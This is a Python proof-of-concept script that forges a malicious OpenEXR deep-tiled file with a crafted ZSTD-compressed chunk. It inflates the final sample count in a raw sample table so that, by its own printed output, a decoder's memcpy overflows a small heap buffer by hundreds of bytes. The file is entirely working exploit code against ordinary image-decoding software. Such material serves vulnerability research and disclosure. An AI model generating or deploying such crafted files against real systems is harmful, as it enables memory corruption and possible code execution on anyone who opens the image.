#!/usr/bin/env python3
"""Forge a DEEPTILE+ZSTD chunk the same way make_poc.py forges the scanline chunk.

Tile chunk leader (40 bytes): tilex,tiley,levelx,levely as 4 x uint32 followed
by sample_table_size, packed_size, unpacked_size as 3 x int64. Then the raw
sample table (W*H*4 bytes) and the packed ZSTD frame, as in the deep scanline
PoC. The Core ZSTD undo accepts a raw sample table whenever its byte length
equals the unpacked sample-table length (internal_zstd.c raw-store fallback).
"""
import os
import struct
import subprocess
import sys
import tempfile

BASE = sys.argv[1] if len(sys.argv) > 1 else "baseline_tiled.exr"
OUT = sys.argv[2] if len(sys.argv) > 2 else "poc_tiled.exr"
S = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
U = int(sys.argv[4]) if len(sys.argv) > 4 else 64
PIXEL = int(sys.argv[5], 0) if len(sys.argv) > 5 else 0x41

data = open(BASE, "rb").read()
p = 8
while True:
    if data[p] == 0:
        p += 1
        break
    j = data.index(b"\x00", p)
    j = data.index(b"\x00", j + 1)
    sz = struct.unpack_from("<I", data, j + 1)[0]
    p = j + 1 + 4 + sz

hdr_end = p
(off0,) = struct.unpack_from("<Q", data, p)
assert off0 == p + 8, f"offset {off0} != {p + 8}"

q = off0
tx, ty, lx, ly = struct.unpack_from("<4I", data, q)
q += 16
st_sz, pk_sz, un_sz = struct.unpack_from("<qqq", data, q)
q += 24
print(f"baseline tile chunk: tile=({tx},{ty}) level=({lx},{ly}) "
      f"samptab={st_sz} packed={pk_sz} unpacked={un_sz}")

W, H = 64, 1
sampsize = W * H * 4
counts = [1] * (W - 1) + [S]
cum, tbl = 0, bytearray()
for c in counts:
    cum = max(cum, c)
    tbl += struct.pack("<I", cum)
tbl = bytes(tbl)
assert len(tbl) == sampsize
assert struct.unpack_from("<I", tbl, (W - 1) * 4)[0] == S


def shuffle4(b):
    n = len(b) // 4
    o = bytearray(len(b))
    for i in range(n):
        for j in range(4):
            o[j * n + i] = b[4 * i + j]
    return bytes(o)


pixels = bytes([PIXEL]) * U
inner = struct.pack("<Q", U) + shuffle4(pixels)
with tempfile.NamedTemporaryFile(delete=False) as tf:
    tf.write(inner)
    tmp = tf.name
payload = subprocess.run(["zstd", "-q", "-c", "-19", tmp],
                         capture_output=True, check=True).stdout
os.unlink(tmp)

MAGIC = 8248453963162350458
frame = (struct.pack("<Q", MAGIC) + struct.pack("<I", 1)
         + struct.pack("<I", 0) + struct.pack("<Q", len(payload)) + payload)
new_pk = len(frame)
assert new_pk != U, "packed==unpacked would take the memcpy fast path"

chunk = (struct.pack("<4I", tx, ty, lx, ly)
         + struct.pack("<qqq", sampsize, new_pk, U)
         + tbl + frame)
out = data[:off0] + chunk
open(OUT, "wb").write(out)

grid_total = S * 4
print(f"poc: samptab={sampsize} (raw) packed={new_pk} unpacked={U} pixel=0x{PIXEL:02x}")
print(f"forged totsamp={S} combSampSize=4 GRID_TOTAL={grid_total}")
print(f"split=0 (all-float part) -> legacy split guard FALSE")
print(f"sort2 would memcpy {grid_total} bytes into a {U}-byte buffer "
      f"(overflow {grid_total - U} bytes)")
print(f"wrote {OUT} ({len(out)} bytes)")
